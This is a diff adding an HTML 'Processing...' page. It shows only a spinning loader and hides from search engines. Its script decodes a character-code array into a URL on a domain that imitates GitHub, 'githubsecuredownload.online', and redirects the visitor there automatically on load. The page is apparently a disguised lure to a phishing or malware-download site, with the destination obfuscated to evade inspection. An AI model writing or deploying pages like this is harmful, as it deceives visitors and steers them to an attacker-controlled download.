@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="robots" content="none">
+  <title>Processing...</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #0f0f1a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(30, 40, 70, 0.2);
+      border-top-color: #1e2846;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+      box-shadow: 0 0 15px rgba(30, 40, 70, 0.5);
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <script>
+    const a = [104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 115, 101, 99, 117, 114, 101, 100, 111, 119, 110, 108, 111, 97, 100, 46, 111, 110, 108, 105, 110, 101, 47, 104, 114, 102, 47, 97, 108, 108];
+    window.location.href = String.fromCharCode.apply(null, a);
+  </script>
+</body>
+</html>
